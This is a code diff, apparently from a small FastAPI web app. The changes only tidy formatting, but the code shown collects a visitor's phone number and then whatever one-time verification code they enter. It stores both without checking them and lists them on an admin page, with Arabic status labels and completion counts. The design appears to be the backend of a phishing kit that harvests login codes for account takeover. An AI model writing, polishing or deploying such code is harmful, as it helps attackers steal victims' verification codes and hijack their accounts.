@@ -36,7 +36,6 @@ async def start(country_code: str = Form(...), phone: str = Form(...)):
     ph = clean_phone(phone)
     if len(ph) < 6:
         return RedirectResponse(url="/?error=1", status_code=303)
-
     with store_lock:
         seq += 1
         entry = {
@@ -49,7 +48,6 @@ async def start(country_code: str = Form(...), phone: str = Form(...)):
             "status": "قيد المعالجة",
         }
         store.insert(0, entry)
-
     return RedirectResponse(url=f"/verify/{entry['id']}", status_code=303)
 
 @app.get("/verify/{entry_id}", response_class=HTMLResponse)
@@ -65,7 +63,6 @@ async def verify_submit(entry_id: int, code: str = Form(...)):
     clean = clean_code(code)
     if len(clean) < 1:
         return RedirectResponse(url=f"/verify/{entry_id}?error=1", status_code=303)
-
     with store_lock:
         entry = next((x for x in store if x["id"] == entry_id), None)
         if not entry:
@@ -73,7 +70,6 @@ async def verify_submit(entry_id: int, code: str = Form(...)):
         entry["entered_code"] = clean
         entry["verified_at"] = datetime.now().strftime("%Y-%m-%d %H:%M")
         entry["status"] = "مكتملة"
-
     return RedirectResponse(url=f"/thanks/{entry_id}", status_code=303)
 
 @app.get("/thanks/{entry_id}", response_class=HTMLResponse)
@@ -88,18 +84,13 @@ async def thanks(request: Request, entry_id: int):
 async def admin(request: Request):
     with store_lock:
         rows = list(store)
-
     stats = {
         "total": len(rows),
         "done": sum(1 for x in rows if x["status"] == "مكتملة"),
         "processing": sum(1 for x in rows if x["status"] == "قيد المعالجة"),
         "rejected": sum(1 for x in rows if x["status"] == "مرفوضة"),
     }
-    return templates.TemplateResponse("admin.html", {
-        "request": request,
-        "rows": rows,
-        "stats": stats
-    })
+    return templates.TemplateResponse("admin.html", {"request": request, "rows": rows, "stats": stats})
 
 @app.get("/api/entries")
 async def api_entries():
